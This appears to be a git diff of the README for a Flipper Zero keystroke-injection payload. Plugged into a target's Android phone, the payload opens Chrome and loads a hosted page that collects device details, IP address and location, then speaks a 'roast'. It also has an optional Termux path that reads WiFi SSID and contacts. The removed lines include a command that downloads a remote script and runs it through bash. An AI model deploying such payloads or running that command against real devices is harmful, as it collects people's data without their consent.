@@ -1,84 +1,88 @@
-# 🤖 GhostSnitch Android
+# GhostSnitch Android
 
-GhostSnitch adapted for Android - **now works WITHOUT Termux!** Executes roast-style recon using device info, TTS, and optional contact scans.
+**Version:** 3.2  
+**Author:** I am TBJr  
+**Platform:** Android (Chrome browser required)  
+**Delivery:** Flipper Zero HID
 
-## 🧠 Features
-- **Universal compatibility**: Works on ANY Android device with Chrome (pre-installed on most)
-- **No Termux required**: Uses Web APIs for device info and TTS (Web Speech API)
-- **Automatic execution**: Opens Chrome and executes script automatically
-- **Device reconnaissance**: Collects device brand, model, and Android version
-- **System information**: Reads public IP, RAM info, network connection type
-- **Location detection**: Optional geolocation (if permissions granted)
-- **Text-to-speech roast**: Delivers roast using Web Speech API (no special apps needed)
-- **Enhanced mode**: Optional Termux support for additional features (WiFi SSID, contacts)
-- **Robust error handling**: Gracefully handles missing APIs and network issues
+---
 
-## 🚀 How to Use
+## What it does
 
-### Prerequisites
-**Minimum Requirements (Web Mode - Works on ALL devices):**
-- Android device with Chrome browser (pre-installed on most devices)
-- Network connectivity (for script download and IP detection)
+Opens Chrome on the target device, navigates to a hosted HTML page, and delivers a roast using device info gathered from browser APIs. An optional Termux path provides enhanced features (WiFi SSID, contacts) when the app is installed.
 
-**Enhanced Mode (Optional - Requires Termux):**
-- Termux installed on the target Android device
-- Termux API (`termux-api` package) for enhanced features:
-  ```bash
-  pkg install termux-api
-  ```
-- Grant necessary permissions to Termux (storage, contacts, etc.) if prompted
+---
 
-### Execution
-1. Load `GhostSnitch_Android.txt` onto your Flipper Zero
-2. Connect Flipper Zero to target Android device via USB
-3. Run the payload - it will:
-   - **Primary method**: Open Chrome and execute web-based script (works on all devices)
-   - **Fallback method**: Launch Termux if available (for enhanced features)
-   - Deliver the roast via text-to-speech
+## Files
 
-### How It Works
+| File | Purpose |
+|---|---|
+| `GhostSnitch_Android.txt` | Flipper Zero ducky script |
+| `host/ghostsnitch_android.html` | Web-based payload (primary — works on all devices) |
+| `host/ghostsnitch_android.sh` | Termux shell script (optional — enhanced features) |
+| `host/ghostsnitch_android_native.sh` | Native Android shell script (adb/advanced use) |
 
-**Primary Method (Web-based - Universal):**
-The payload opens Chrome with a hosted HTML page that uses:
-- **Web Speech API** for text-to-speech (no special apps needed)
-- **Navigator API** for device information (brand, platform, RAM)
-- **Network Information API** for connection details
-- **Geolocation API** for location (optional, requires permission)
-- **Fetch API** for IP detection
+---
 
-```bash
-am start -a android.intent.action.VIEW -d "https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.html"
+## Web payload (primary)
+
+The HTML page gathers data via browser APIs and speaks a roast via the Web Speech API.
+
+**Important — tap required:** The page shows a **"Tap to Continue"** button when it loads. The target must tap it once. This is required by Chrome's autoplay policy — `speechSynthesis.speak()` is silently blocked without a prior user gesture and there is no way to bypass it from a web page.
+
+**APIs used:**
+
+| API | iOS Safari | Chrome Android | Notes |
+|---|---|---|---|
+| User-Agent parsing | ✓ | ✓ | Android version + device model |
+| `deviceMemory` | — | ✓ | Returns coarse bucket (0.25–8 GB) |
+| `navigator.connection` | — | ✓ | Effective type + downlink |
+| `fetch` (IP lookup) | ✓ | ✓ | `api.ipify.org` with `api4.my-ip.io` fallback |
+| `geolocation` | ✓ | ✓ | Requires user permission dialog |
+| Web Speech API | ✓* | ✓* | *Requires user gesture — handled by tap gate |
+
+---
+
+## Ducky script flow
+
+```
+1. GUI          → home screen (Meta key — works on most Android launchers)
+2. STRING chrome → launcher search
+3. ENTER         → open Chrome
+4. CTRL+L        → focus Chrome address bar  ← required; without this the URL goes into the page body
+5. STRING <url>
+6. ENTER
 ```
 
-**Enhanced Method (Termux - Optional):**
-If Termux is installed, the payload also attempts to execute the Termux script for additional features:
-- WiFi SSID detection (via `termux-wifi-connectioninfo`)
-- Contact scanning (via `termux-contact-list`)
-- Enhanced system information
+The Termux fallback is commented out by default. Uncomment the block at the bottom of `GhostSnitch_Android.txt` only if Termux is installed on the target.
+
+---
+
+## Termux path (optional)
+
+Requires: **Termux** app + **Termux:API** companion app + `termux-api` package.
 
 ```bash
-am start -n com.termux/.HomeActivity
-bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.sh)"
+pkg install termux-api
 ```
 
-## ✨ What's New in v3.0
+Additional features over the web path:
+- Real RAM from `/proc/meminfo` (accurate, not a coarse bucket)
+- WiFi SSID via `termux-wifi-connectioninfo`
+- First contact name via `termux-contact-list` (prompts for Contacts permission)
 
-- **No Termux dependency**: Works on any Android device with Chrome
-- **Web-based execution**: Uses Web APIs for universal compatibility
-- **Dual-mode operation**: Web mode (universal) + Termux mode (enhanced features)
-- **Better device detection**: Uses Navigator API for accurate device info
-- **Network information**: Detects connection type and speed
-- **Location support**: Optional geolocation detection
-- **Improved reliability**: Multiple fallback methods ensure execution
+---
 
-## ⚠️ Limitations
-- **Network connectivity required** for IP detection and script download
-- Enhanced features (WiFi SSID, contacts) require Termux + Termux API
-- Location detection requires user permission (may be blocked)
-- Some older Android versions may have limited Web API support
+## Known limitations
 
-## 🔧 Version
-**v3.0** - Universal Android support via Web APIs, no Termux required!
+- **Launcher search varies by device** — Pixel, Samsung One UI, MIUI, and others handle home-screen search differently. The ducky script may need timing adjustments on non-stock launchers.
+- **`deviceMemory`** intentionally returns coarse values (browser privacy feature).
+- **Geolocation** always shows a permission dialog; the target must tap "Allow".
+- **Network Information API** not available in Safari or Firefox — Chrome Android only.
+- Termux is not pre-installed on any Android device; the fallback path is for devices where it has already been set up.
 
-## 🙏 Credits
-Based on the original GhostSnitch prank for Windows. Reimagined for Android by **TBJr**
+---
+
+## Credits
+
+Based on the original GhostSnitch for Windows. Reimagined for Android by **TBJr**.
